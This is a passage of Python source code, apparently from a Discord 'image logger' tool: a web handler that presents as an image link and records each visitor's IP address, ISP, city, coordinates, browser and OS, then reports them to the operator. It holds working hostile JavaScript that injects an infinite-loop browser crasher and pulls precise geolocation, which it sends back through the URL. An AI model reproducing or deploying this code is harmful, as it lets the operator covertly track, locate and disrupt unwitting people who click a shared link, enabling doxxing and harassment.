                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
